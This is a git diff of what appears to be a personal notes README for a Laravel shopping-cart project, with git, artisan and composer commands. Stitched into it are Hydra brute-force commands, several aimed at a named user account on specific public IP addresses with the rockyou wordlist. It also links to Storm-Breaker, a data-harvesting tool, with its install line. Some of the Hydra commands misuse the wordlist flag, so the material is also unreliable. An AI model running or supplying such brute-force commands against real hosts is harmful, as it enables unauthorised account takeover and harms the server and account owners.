@@ -10,7 +10,7 @@ npm run dev
 echo "# lrvl_crud" >> README.md
 git init
 git add README.md
-git commit -m "27-02-25-3rd"
+git commit -m "04-03-2k25"
 git branch -M main
 git remote add origin https://github.com/ali321213/lrvl_crud.git
 git push -u origin main
@@ -324,5 +324,47 @@ PHP:
 </ul>
 ```
 
-Conclusion
+Conclusion:-
 This setup provides a basic shopping cart functionality using Laravel's session to store cart data. You can further enhance this by integrating user authentication to persist the cart across sessions and adding more features like applying discounts or handling multiple currencies.
+
+
+
+Examples:-
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+
+192.168.119.242
+
+
+$ hydra -l <username> -p <password> <server> <service>
+$ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 157.240.227.174 ssh
+$ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 157.240.3.174 ssh
+$ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 2a03:2880:f267:e5:face:b00c:0:4420 ssh
+
+
+
+2a03:2880:f267:e5:face:b00c:0:4420
+          157.240.227.174
+
+ping 157.240.227.174
+
+
+
+https://github.com/ultrasecurity/Storm-Breaker
+
+apt install python3-requests python3-colorama python3-psutil
+
+
+
+php artisan make:model Product -m
+php artisan make:model Category -m
+php artisan make:model product_images -m
+php artisan make:model Brand -m
+php artisan make:controller CartController
+
+composer require darryldecode/cart
+composer require jeroennoten/laravel-adminlte
+composer require livewire/livewire
